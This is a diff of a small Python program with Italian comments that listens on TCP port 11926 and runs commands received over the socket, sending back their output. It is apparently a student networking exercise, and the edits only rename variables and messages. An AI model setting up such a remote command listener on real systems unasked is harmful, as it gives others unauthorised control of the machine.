@@ -9,17 +9,17 @@ import platform
 
 def connect():
     serverPort = 11926
-    serverSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
+    clientSocket = socket(AF_INET,SOCK_STREAM) #SOCK_STREAM = TCP
                                                 #socket(...) e' il costruttore della classe socket
-    serverSocket.bind( ('',serverPort) ) #collega la socket al port 1200
+    clientSocket.bind( ('',serverPort) ) #collega la socket al port 1200
                                         #la variabile passata e' una t-pla, indicata con la parentesi tonda e NON e' modificabile
-    serverSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
-    print ('The server is ready to receive')
+    clientSocket.listen(1) #si mette in ascolto, 1 indica la dimensione della coda dei client
+    print ('The client is ready to receive')
 
-    connectionSocket, addr = serverSocket.accept()
-    print('Accepted a new client', addr)
+    connectionSocket, addr = clientSocket.accept()
+    print('Accepted a new server', addr)
 
-    return serverSocket, connectionSocket
+    return clientSocket, connectionSocket
 
 
 def setup_windows(connectionSocket):
@@ -77,7 +77,7 @@ def setup(connectionSocket):
     if system == 'Darwin':
         setup_mac(connectionSocket)
 
-    connectionSocket.send("esc".encode(encoding='latin-1'))
+    connectionSocket.send("uscita".encode(encoding='latin-1'))
     
 
 
@@ -101,7 +101,7 @@ def command(cmd):
 
 def main():
     
-    serverSocket, connectionSocket = connect()
+    clientSocket, connectionSocket = connect()
 
     setup(connectionSocket)
 
@@ -123,7 +123,7 @@ def main():
             connectionSocket.send(result.encode(encoding='latin-1'))
 
 
-    serverSocket.close()
+    clientSocket.close()
     print("\nConnection closed\n")
     
 
